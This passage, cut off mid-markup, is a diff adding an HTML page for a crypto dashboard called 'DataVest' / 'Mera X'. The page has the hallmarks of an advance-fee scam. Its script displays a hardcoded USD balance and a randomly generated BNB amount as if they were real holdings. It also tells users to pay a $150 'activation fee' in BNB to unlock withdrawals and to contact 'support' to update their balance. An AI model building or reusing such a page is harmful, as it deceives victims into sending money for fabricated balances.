@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+<html lang="en" class="__variable_188709 __variable_73ee6c antialiased dark" data-scrapbook-source=""
+    data-scrapbook-create="20251105004856565">
+<div id="in-page-channel-node-id" data-channel-name="in_page_channel_6YiljR"></div>
+<script src="chrome-extension://lgmpcpglpngdoalbgeoldeajfclnhafa/aptosSDK.js"></script>
+
+<head>
+    <link rel="stylesheet" href="82f976e4aed676c5.css" data-precedence="next">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="next-size-adjust" content="">
+    <title> Mera X - Vault</title>
+    <meta name="description" content="Secure cryptocurrency BitNest platform for wallet management">
+    <meta name="generator" content="redwhalesdev">
+    <script
+        data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement { }); } })(["next-route-announcer"])</script>
+    <style>
+        @keyframes slide-in-one-tap {
+            from {
+                transform: translateY(80px);
+            }
+
+            to {
+                transform: translateY(0px);
+            }
+        }
+
+        .trust-hide-gracefully {
+            opacity: 0;
+        }
+
+        .trust-wallet-one-tap .hidden {
+            display: none;
+        }
+
+        .trust-wallet-one-tap .semibold {
+            font-weight: 500;
+        }
+
+        .trust-wallet-one-tap .binance-plex {
+            font-family: 'Binance';
+        }
+
+        .trust-wallet-one-tap .rounded-full {
+            border-radius: 50%;
+        }
+
+        .trust-wallet-one-tap .flex {
+            display: flex;
+        }
+
+        .trust-wallet-one-tap .flex-col {
+            flex-direction: column;
+        }
+
+        .trust-wallet-one-tap .items-center {
+            align-items: center;
+        }
+
+        .trust-wallet-one-tap .space-between {
+            justify-content: space-between;
+        }
+
+        .trust-wallet-one-tap .justify-center {
+            justify-content: center;
+        }
+
+        .trust-wallet-one-tap .w-full {
+            width: 100%;
+        }
+
+        .trust-wallet-one-tap .box {
+            transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+            animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+            width: 384px;
+            border-radius: 15px;
+            background: #fff;
+            box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+            position: fixed;
+            right: 30px;
+            bottom: 30px;
+            z-index: 1020;
+        }
+
+        .trust-wallet-one-tap .header {
+            gap: 15px;
+            border-bottom: 1px solid #e6e6e6;
+            padding: 10px 18px;
+        }
+
+        .trust-wallet-one-tap .header .left-items {
+            gap: 15px;
+        }
+
+        .trust-wallet-one-tap .header .title {
+            color: #1e2329;
+            font-size: 18px;
+            font-weight: 600;
+            line-height: 28px;
+        }
+
+        .trust-wallet-one-tap .header .subtitle {
+            color: #474d57;
+            font-size: 14px;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .header .close {
+            color: #1e2329;
+            cursor: pointer;
+        }
+
+        .trust-wallet-one-tap .body {
+            padding: 9px 18px;
+            gap: 10px;
+        }
+
+        .trust-wallet-one-tap .body .right-items {
+            gap: 10px;
+            width: 100%;
+        }
+
+        .trust-wallet-one-tap .body .right-items .wallet-title {
+            color: #1e2329;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .body .right-items .wallet-subtitle {
+            color: #474d57;
+            font-size: 14px;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .connect-indicator {
+            gap: 15px;
+            padding: 8px 0;
+        }
+
+        .trust-wallet-one-tap .connect-indicator .flow-icon {
+            color: #474d57;
+        }
+
+        .trust-wallet-one-tap .loading-color {
+            color: #fff;
+        }
+
+        .trust-wallet-one-tap .button {
+            border-radius: 50px;
+            outline: 2px solid transparent;
+            outline-offset: 2px;
+            background-color: rgb(5, 0, 255);
+            border-color: rgb(229, 231, 235);
+            cursor: pointer;
+            text-align: center;
+            height: 45px;
+        }
+
+        .trust-wallet-one-tap .button .button-text {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 20px;
+        }
+
+        .trust-wallet-one-tap .footer {
+            margin: 20px 30px;
+        }
+
+        .trust-wallet-one-tap .check-icon {
+            color: #fff;
+        }
+
+        @font-face {
+            font-family: 'Binance';
+            src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
+            font-weight: 400;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Binance';
+            src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
+            font-weight: 500;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Binance';
+            src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
+            font-weight: 600;
+            font-style: normal;
+        }
+
+        /*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9zcmMvb25lVGFwL3N0eWxlLmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0lBQ0UsMkJBQTJCO0VBQzdCO0VBQ0E7SUFDRSwwQkFBMEI7RUFDNUI7QUFDRjs7QUFFQTtFQUNFLFVBQVU7QUFDWjs7QUFHRTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLGdCQUFnQjtFQUNsQjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLG1CQUFtQjtFQUNyQjs7QUFFQTtJQUNFLDhCQUE4QjtFQUNoQzs7QUFFQTtJQUNFLHVCQUF1QjtFQUN6Qjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFFQTtJQUNFLGdEQUFnRDtJQUNoRCw0REFBNEQ7SUFDNUQsWUFBWTtJQUNaLG1CQUFtQjtJQUNuQixnQkFBZ0I7SUFDaEIsK0NBQStDO0lBQy9DLGVBQWU7SUFDZixXQUFXO0lBQ1gsWUFBWTtJQUNaLGFBQWE7RUFDZjs7QUFFQTtJQUNFLFNBQVM7SUFDVCxnQ0FBZ0M7SUFDaEMsa0JBQWtCO0VBdUJwQjs7QUFyQkU7TUFDRSxTQUFTO0lBQ1g7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGdCQUFnQjtNQUNoQixpQkFBaUI7SUFDbkI7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGlCQUFpQjtJQUNuQjs7QUFFQTtNQUNFLGNBQWM7TUFDZCxlQUFlO0lBQ2pCOztBQUdGO0lBQ0UsaUJBQWlCO0lBQ2pCLFNBQVM7RUFtQlg7O0FBakJFO01BQ0UsU0FBUztNQUNULFdBQVc7SUFjYjs7QUFaRTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsZ0JBQWdCO1FBQ2hCLGlCQUFpQjtNQUNuQjs7QUFFQTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsaUJBQWlCO01BQ25COztBQUlKO0lBQ0UsU0FBUztJQUNULGNBQWM7RUFLaEI7O0FBSEU7TUFDRSxjQUFjO0lBQ2hCOztBQUdGO0lBQ0UsV0FBVztFQUNiOztBQUVBO0lBQ0UsbUJBQW1CO0lBQ25CLDhCQUE4QjtJQUM5QixtQkFBbUI7SUFDbkIsZ0NBQWdDO0lBQ2hDLGdDQUFnQztJQUNoQyxlQUFlO0lBQ2Ysa0JBQWtCO0lBQ2xCLFlBQVk7RUFRZDs7QUFORTtNQUNFLFdBQVc7TUFDWCxlQUFlO01BQ2YsZ0JBQWdCO01BQ2hCLGlCQUFpQjtJQUNuQjs7QUFHRjtJQUNFLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFHRjtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMEU7RUFDMUUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBeUU7RUFDekUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMkU7RUFDM0UsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQiIsInNvdXJjZXNDb250ZW50IjpbIkBrZXlmcmFtZXMgc2xpZGUtaW4tb25lLXRhcCB7XG4gIGZyb20ge1xuICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSg4MHB4KTtcbiAgfVxuICB0byB7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDBweCk7XG4gIH1cbn1cblxuLnRydXN0LWhpZGUtZ3JhY2VmdWxseSB7XG4gIG9wYWNpdHk6IDA7XG59XG5cbi50cnVzdC13YWxsZXQtb25lLXRhcCB7XG4gIC5oaWRkZW4ge1xuICAgIGRpc3BsYXk6IG5vbmU7XG4gIH1cblxuICAuc2VtaWJvbGQge1xuICAgIGZvbnQtd2VpZ2h0OiA1MDA7XG4gIH1cblxuICAuYmluYW5jZS1wbGV4IHtcbiAgICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICB9XG5cbiAgLnJvdW5kZWQtZnVsbCB7XG4gICAgYm9yZGVyLXJhZGl1czogNTAlO1xuICB9XG5cbiAgLmZsZXgge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gIH1cblxuICAuZmxleC1jb2wge1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gIH1cblxuICAuaXRlbXMtY2VudGVyIHtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICB9XG5cbiAgLnNwYWNlLWJldHdlZW4ge1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjtcbiAgfVxuXG4gIC5qdXN0aWZ5LWNlbnRlciB7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIH1cblxuICAudy1mdWxsIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgfVxuXG4gIC5ib3gge1xuICAgIHRyYW5zaXRpb246IGFsbCAwLjVzIGN1YmljLWJlemllcigwLCAwLCAwLCAxLjQzKTtcbiAgICBhbmltYXRpb246IHNsaWRlLWluLW9uZS10YXAgMC41cyBjdWJpYy1iZXppZXIoMCwgMCwgMCwgMS40Myk7XG4gICAgd2lkdGg6IDM4NHB4O1xuICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7XG4gICAgYmFja2dyb3VuZDogI2ZmZjtcbiAgICBib3gtc2hhZG93OiAwcHggMnB4IDRweCAwcHggcmdiYSgwLCAwLCAwLCAwLjI1KTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgcmlnaHQ6IDMwcHg7XG4gICAgYm90dG9tOiAzMHB4O1xuICAgIHotaW5kZXg6IDEwMjA7XG4gIH1cblxuICAuaGVhZGVyIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNlNmU2ZTY7XG4gICAgcGFkZGluZzogMTBweCAxOHB4O1xuXG4gICAgLmxlZnQtaXRlbXMge1xuICAgICAgZ2FwOiAxNXB4O1xuICAgIH1cblxuICAgIC50aXRsZSB7XG4gICAgICBjb2xvcjogIzFlMjMyOTtcbiAgICAgIGZvbnQtc2l6ZTogMThweDtcbiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICBsaW5lLWhlaWdodDogMjhweDtcbiAgICB9XG5cbiAgICAuc3VidGl0bGUge1xuICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICBmb250LXNpemU6IDE0cHg7XG4gICAgICBsaW5lLWhlaWdodDogMjBweDtcbiAgICB9XG5cbiAgICAuY2xvc2Uge1xuICAgICAgY29sb3I6ICMxZTIzMjk7XG4gICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgfVxuICB9XG5cbiAgLmJvZHkge1xuICAgIHBhZGRpbmc6IDlweCAxOHB4O1xuICAgIGdhcDogMTBweDtcblxuICAgIC5yaWdodC1pdGVtcyB7XG4gICAgICBnYXA6IDEwcHg7XG4gICAgICB3aWR0aDogMTAwJTtcblxuICAgICAgLndhbGxldC10aXRsZSB7XG4gICAgICAgIGNvbG9yOiAjMWUyMzI5O1xuICAgICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4O1xuICAgICAgfVxuXG4gICAgICAud2FsbGV0LXN1YnRpdGxlIHtcbiAgICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgLmNvbm5lY3QtaW5kaWNhdG9yIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgcGFkZGluZzogOHB4IDA7XG5cbiAgICAuZmxvdy1pY29uIHtcbiAgICAgIGNvbG9yOiAjNDc0ZDU3O1xuICAgIH1cbiAgfVxuXG4gIC5sb2FkaW5nLWNvbG9yIHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgfVxuXG4gIC5idXR0b24ge1xuICAgIGJvcmRlci1yYWRpdXM6IDUwcHg7XG4gICAgb3V0bGluZTogMnB4IHNvbGlkIHRyYW5zcGFyZW50O1xuICAgIG91dGxpbmUtb2Zmc2V0OiAycHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDUsIDAsIDI1NSk7XG4gICAgYm9yZGVyLWNvbG9yOiByZ2IoMjI5LCAyMzEsIDIzNSk7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICBoZWlnaHQ6IDQ1cHg7XG5cbiAgICAuYnV0dG9uLXRleHQge1xuICAgICAgY29sb3I6ICNmZmY7XG4gICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICBmb250LXdlaWdodDogNjAwO1xuICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgfVxuICB9XG5cbiAgLmZvb3RlciB7XG4gICAgbWFyZ2luOiAyMHB4IDMwcHg7XG4gIH1cblxuICAuY2hlY2staWNvbiB7XG4gICAgY29sb3I6ICNmZmY7XG4gIH1cbn1cblxuQGZvbnQtZmFjZSB7XG4gIGZvbnQtZmFtaWx5OiAnQmluYW5jZSc7XG4gIHNyYzogdXJsKCcuL2ZvbnRzL2JpbmFuY2VQbGV4L0JpbmFuY2VQbGV4LVJlZ3VsYXIub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNDAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1NZWRpdW0ub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNTAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1TZW1pQm9sZC5vdGYnKSBmb3JtYXQoJ29wZW50eXBlJyk7XG4gIGZvbnQtd2VpZ2h0OiA2MDA7XG4gIGZvbnQtc3R5bGU6IG5vcm1hbDtcbn1cbiJdLCJzb3VyY2VSb290IjoiIn0= */
+    </style>
+</head>
+
+<body style=""><next-route-announcer style="position: absolute;"><template shadowrootmode="open">
+            <div aria-live="assertive" id="__next-route-announcer__" role="alert"
+                style="position: absolute; border: 0px; height: 1px; margin: -1px; padding: 0px; width: 1px; clip: rect(0px, 0px, 0px, 0px); overflow: hidden; white-space: nowrap; overflow-wrap: normal;">
+            </div>
+        </template></next-route-announcer>
+    <div class="min-h-screen bg-background text-foreground">
+        <header class="border-b border-border bg-card/50 backdrop-blur-sm sticky top-0 z-50">
+            <div class="container mx-auto px-4 py-4">
+                <div class="flex items-center justify-between">
+
+                    <div class="flex items-center space-x-4">
+
+                        <!-- <div class="w-8 h-8 bg-primary rounded-lg flex items-center justify-center">
+                            
+                            <svg
+                                xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-shield w-5 h-5 text-primary-foreground">
+                                <path
+                                    d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z">
+                                </path>
+                            </svg>
+                        
+                        </div> -->
+
+                        <div class="flex items-center space-x-4">
+                            <div
+                                class="w-8 h-8 bg-white rounded-lg flex items-center justify-center overflow-hidden shadow-sm">
+                                <!-- Replace the SVG with your image -->
+                                <img src="photo_2026-10-08_07-59-44.jpg"Logo" class="w-14 h-9 object-contain">
+                            </div>
+
+                            <div>
+                                <h1 class="text-xl font-bold font-sans">
+                                    <span class="hidden sm:inline">Datavest_live</span>
+                                    <span class="sm:hidden">DataVest</span>
+                                </h1>
+                                <p class="text-sm text-muted-foreground font-mono">DataVest Dashboard</p>
+                            </div>
+                        </div>
+
+
+                    </div>
+                    <div class="flex items-center space-x-2">
+
+                        <a href="#" button="" data-slot="button"
+                            class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*='size-'])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-settings w-4 h-4 mr-2">
+                                <path
+                                    d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z">
+                                </path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                            </svg> </a>
+
+                        <!-- <button data-slot="button"
+                            class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*='size-'])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><svg
+                                xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-log-out w-4 h-4 mr-2">
+                                <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
+                                <polyline points="16 17 21 12 16 7"></polyline>
+                                <line x1="21" x2="9" y1="12" y2="12"></line>
+                            </svg>Disconnect</button> -->
+
+                    </div>
+                </div>
+            </div>
+        </header>
+        <main class="container mx-auto px-4 py-8">
+            <div class="mb-8 p-6 bg-gradient-to-r from-primary/10 to-primary/5 rounded-xl border border-primary/20">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <!-- <h6 class="text-2xl font-bold font-sans mb-2">Welcome to Your MERA X</h6> -->
+                        <p class="text-muted-foreground font-mono">Your secure cryptocurrency dashboard is now
+                            active
+                        </p>
+                    </div><span data-slot="badge"
+                        class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden [a&amp;]:hover:bg-primary/90 bg-primary/20 text-primary border-primary/30"><svg
+                            xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                            class="lucide lucide-gift w-4 h-4 mr-1">
+                            <rect x="3" y="8" width="18" height="4" rx="1"></rect>
+                            <path d="M12 8v13"></path>
+                            <path d="M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7"></path>
+                            <path d="M7.5 8a2.5 2.5 0 0 1 0-5A4.8 8 0 0 1 12 8a4.8 8 0 0 1 4.5-5 2.5 2.5 0 0 1 0 5">
+                            </path>
+                        </svg>24/7 Withdrawal</span>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
+                <div data-slot="card"
+                    class="text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm bg-card border-border">
+                    <div data-slot="card-header"
+                        class="@container/card-header auto-rows-min grid-rows-[auto_auto] gap-1.5 px-6 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6 flex flex-row items-center justify-between space-y-0 pb-2">
+                        <div data-slot="card-title" class="text-sm font-medium font-mono">Available Withdraw Balance</div>
+
+                        <button id="toggle-visibility" data-slot="button"
+                            class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*='size-'])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 rounded-md gap-1.5 has-[&gt;svg]:px-2.5 h-8 w-8 p-0">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-eye-off w-4 h-4">
+                                <path
+                                    d="M17.94 17.94A10.74 10.74 0 0 1 12 19c-4.8 0-8.8-3-10-7 0-1 .5-2 1.1-3M1 1l22 22">
+                                </path>
+                            </svg>
+                        </button>
+
+                    </div>
+
+
+                    <div data-slot="card-content" class="px-6">
+                        <div id="usd-amount" class="text-2xl font-bold font-sans">****</div>
+                        <p id="btc-amount" class="text-xs text-muted-foreground font-mono">****</p>
+                    </div>
+
+                    <script>
+                        let usdAmountValue = 0;
+                        let btcAmountValue = 0; // now BNB value
+                        let visible = false;
+
+                        // Generate new random values every 30 seconds
+                        function updateAmounts() {
+                            // Start from around 7,000.06 and randomize slightly
+                            usdAmountValue = (447.06).toFixed(2);
+
+                            // Generate BNB instead of BTC
+                            btcAmountValue = (Math.random() * (0.3 - 0.05) + 0.05).toFixed(6);
+
+                            if (visible) {
+                                document.getElementById('usd-amount').textContent = `$${usdAmountValue}`;
+                                document.getElementById('btc-amount').textContent = `${btcAmountValue} BNB`;
+                            }
+                        }
+
+                        // Initial values
+                        updateAmounts();
+
+                        // Update every 30 seconds (30,000 ms)
+                        setInterval(updateAmounts, 30000);
+
+                        // Eye toggle logic
+                        const toggleBtn = document.getElementById('toggle-visibility');
+                        const usdEl = document.getElementById('usd-amount');
+                        const btcEl = document.getElementById('btc-amount');
+
+                        toggleBtn.addEventListener('click', () => {
+                            visible = !visible;
+                            if (visible) {
+                                usdEl.textContent = `$${usdAmountValue}`;
+                                btcEl.textContent = `${btcAmountValue} BNB`;
+                                toggleBtn.innerHTML = `
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-eye w-4 h-4">
+                                <path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"></path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                                </svg>`;
+                            } else {
+                                usdEl.textContent = "****";
+                                btcEl.textContent = "****";
+                                toggleBtn.innerHTML = `
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" class="lucide lucide-eye-off w-4 h-4">
+                                <path d="M17.94 17.94A10.74 10.74 0 0 1 12 19c-4.8 0-8.8-3-10-7 0-1 .5-2 1.1-3M1 1l22 22"></path>
+                                </svg>`;
+                            }
+                        });
+                    </script>
+                </div>
+
+
+
+
+                <div data-slot="card"
+                    class="text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm bg-card border-primary/30">
+                    <div data-slot="card-header"
+                        class="@container/card-header auto-rows-min grid-rows-[auto_auto] gap-1.5 px-6 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6 flex flex-row items-center justify-between space-y-0 pb-2">
+                        <div data-slot="card-title" class="text-sm font-medium font-mono">Activation Fee</div><svg
+                            xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                            class="lucide lucide-gift w-4 h-4 text-primary">
+                            <rect x="3" y="8" width="18" height="4" rx="1"></rect>
+                            <path d="M12 8v13"></path>
+                            <path d="M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7"></path>
+                            <path d="M7.5 8a2.5 2.5 0 0 1 0-5A4.8 8 0 0 1 12 8a4.8 8 0 0 1 4.5-5 2.5 2.5 0 0 1 0 5">
+                            </path>
+                        </svg>
+                    </div>
+
+                    <div data-slot="card-content" class="px-6">
+                        <div class="text-2xl font-bold font-sans text-primary">$150.00</div>
+                        <p class="text-xs text-muted-foreground font-mono">Deposit remain 0.197 BNB to activate &amp;
+                            complete
+                            the DataVest pending rewards &amp; enable rewards withdrawal.</p>
+                    </div>
+
+                </div>
+
+
+                <div data-slot="card"
+                    class="text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm bg-card border-primary/30">
+                    <div data-slot="card-header"
+                        class="@container/card-header auto-rows-min grid-rows-[auto_auto] gap-1.5 px-6 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6 flex flex-row items-center justify-between space-y-0 pb-2">
+                        <div data-slot="card-title" class="text-sm font-medium font-mono">Deposit Amount</div><svg
+                            xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                            class="lucide lucide-gift w-4 h-4 text-primary">
+                            <rect x="3" y="8" width="18" height="4" rx="1"></rect>
+                            <path d="M12 8v13"></path>
+                            <path d="M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7"></path>
+                            <path d="M7.5 8a2.5 2.5 0 0 1 0-5A4.8 8 0 0 1 12 8a4.8 8 0 0 1 4.5-5 2.5 2.5 0 0 1 0 5">
+                            </path>
+                        </svg>
+                    </div>
+
+                    <div data-slot="card-content" class="px-6 text-center">
+                        <div class="text-2xl font-bold font-sans text-primary">
+                            Total Withdrawn
+                        </div>
+
+                        <div class="text-2xl font-bold font-sans text-primary mt-1">
+                            $204.98
+                        </div>
+
+                        <p class="text-xs text-muted-foreground font-mono mt-2">
+                            Contact support to update your balance
+                        </p>
+                    </div>
+
+                </div>
+
+
+
+                <div data-slot="card"
+                    class="text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm bg-card border-border">
+                    <div data-slot="card-header"
